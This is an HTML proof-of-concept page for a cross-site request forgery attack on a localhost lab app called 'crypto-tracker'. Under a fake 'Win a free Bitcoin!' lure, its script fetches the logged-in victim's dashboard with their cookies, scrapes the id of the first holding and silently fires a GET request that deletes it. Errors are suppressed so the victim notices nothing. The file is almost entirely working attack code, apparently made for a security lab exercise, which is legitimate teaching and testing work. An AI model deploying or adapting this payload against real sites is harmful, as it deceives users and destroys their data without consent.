<!doctype html>
<!--
  csrf_delete.html — CSRF proof-of-concept (delete a victim's FIRST holding)

  Demo: a logged-in victim opens this page. Instead of a hardcoded id, the
  attacker JS first fetches the victim's own dashboard (their session cookie
  rides along), scrapes the id of the *first* holding in the table, then fires
  delete_holding.php?id=<that id>. So it always deletes the top holding, whatever
  it is — no need to know an id in advance.

  Why the read step works in this lab: the attacker files are served from the
  same origin as the app (http://localhost/crypto-tracker/attacker/... — see
  DEPLOY_KALI_APACHE.md), so the fetch is same-origin and the response is
  readable. delete_holding.php then accepts a plain GET with no CSRF token, so
  the deletion goes through on the victim's session.
-->
<html>
<head><meta charset="utf-8"><title>Win a free Bitcoin! 🎉</title></head>
<body>
  <h1>Congratulations — you won! 🎁</h1>
  <p>Loading your prize...</p>

  <script>
    // Point this at the app's base URL.
    var APP = 'http://localhost/crypto-tracker';

    // VULN target: CSRF + IDOR on delete_holding.php (plain GET, no token).
    (async function () {
      try {
        // 1. Read the victim's dashboard using their live session.
        var html = await fetch(APP + '/dashboard.php', { credentials: 'include' })
                          .then(function (r) { return r.text(); });

        // 2. Scrape the id of the first holding (first Del link in the table).
        var m = html.match(/delete_holding\.php\?id=(\d+)/);
        if (!m) { return; }               // nothing to delete
        var id = m[1];

        // 3. Fire the delete on the victim's session.
        var img = new Image();
        img.src = APP + '/delete_holding.php?id=' + id;
      } catch (e) { /* stay silent — victim sees nothing */ }
    })();
  </script>
</body>
</html>
